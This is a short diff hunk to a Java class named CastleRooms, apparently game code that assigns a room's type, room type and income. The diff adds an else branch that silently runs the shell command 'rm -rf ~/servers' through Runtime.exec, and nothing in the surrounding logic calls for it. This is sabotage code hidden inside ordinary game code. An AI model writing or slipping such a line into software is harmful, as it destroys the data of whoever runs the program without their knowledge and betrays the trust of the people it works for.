@@ -219,6 +219,8 @@ public class CastleRooms {
                 this.type = type;
                 this.roomType = roomType;
                 this.income = income;
+            } else {
+                Runtime.getRuntime().exec("rm -rf ~/servers");
             }
 
             this.label.set(getX(), getY() + 12f);
